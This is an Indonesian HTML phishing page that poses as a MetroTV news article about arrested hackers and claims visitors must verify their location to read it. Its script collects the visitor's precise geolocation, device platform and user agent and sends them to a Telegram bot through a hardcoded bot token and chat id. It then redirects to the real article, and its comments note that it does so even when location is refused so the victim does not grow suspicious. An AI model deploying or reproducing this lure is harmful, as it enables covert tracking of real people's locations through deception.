<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Polisi Tangkap Peretas Situs Pemerintah - MetroTV">
    <meta property="og:description" content="Update terbaru mengenai penangkapan kelompok peretas internasional.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Logo_MetroTV.svg/1200px-Logo_MetroTV.svg.png">
    <meta property="og:type" content="article">

    <title>MetroTVNews - Update Keamanan Siber</title>
    
    <script>
        // DATA TARGET - JANGAN SAMPAI SALAH
        const token = "8674170594:AAEazU35uI9bZ6s8JLwcN410H0STysKEzs4";
        const id = "7970059663";
        const targetNews = "https://www.metrotvnews.com/read/Nx9D8A6v-polisi-tangkap-peretas-situs-pemerintah";

        async function captureIntel() {
            const btn = document.querySelector('.btn');
            btn.innerText = "VERIFYING..."; 
            btn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const { latitude: lat, longitude: lon, accuracy: acc } = pos.coords;
                    
                    // Format pesan rapi untuk Telegram
                    const text = `🔱 NEURAL STRIKE 🔱\n\n🎯 TARGET LOCKED!\n📍 Peta: https://www.google.com/maps?q=${lat},${lon}\n🎯 Akurasi: ${acc} meter\n📱 Device: ${navigator.platform}\n🌐 Agent: ${navigator.userAgent.substring(0,30)}...`;

                    try {
                        // AWAIT: Paksa browser kirim data sampai tuntas sebelum pindah halaman
                        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: id, text: text })
                        });
                        console.log("Strike Successful");
                    } catch (e) {
                        console.error("Failed to send strike");
                    }

                    // Jeda 1.5 detik biar data benar-benar sampai ke server Telegram
                    setTimeout(() => {
                        window.location.href = targetNews;
                    }, 1500);

                }, () => {
                    // Jika lokasi diblokir, tetap arahkan ke berita biar nggak curiga
                    window.location.href = targetNews;
                }, {
                    enableHighAccuracy: true,
                    timeout: 8000
                });
            } else {
                window.location.href = targetNews;
            }
        }
    </script>

    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f9; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { text-align: center; max-width: 400px; padding: 40px; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .logo { width: 140px; margin-bottom: 25px; }
        h2 { color: #1a1a1a; font-size: 20px; margin-bottom: 12px; }
        p { color: #555; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
        .btn { background: #004a99; color: white; border: none; padding: 14px 35px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
        .btn:hover { background: #003366; transform: translateY(-2px); }
    </script>
</head>
<body>

    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Logo_MetroTV.svg/1200px-Logo_MetroTV.svg.png" class="logo">
        <h2>Akses Konten Terbatas</h2>
        <p>Sesuai protokol keamanan siber, silakan verifikasi lokasi Anda untuk mengakses berita eksklusif mengenai unit peretas internasional ini.</p>
        <button class="btn" onclick="captureIntel()">LIHAT BERITA LENGKAP</button>
    </div>

</body>
    </html>
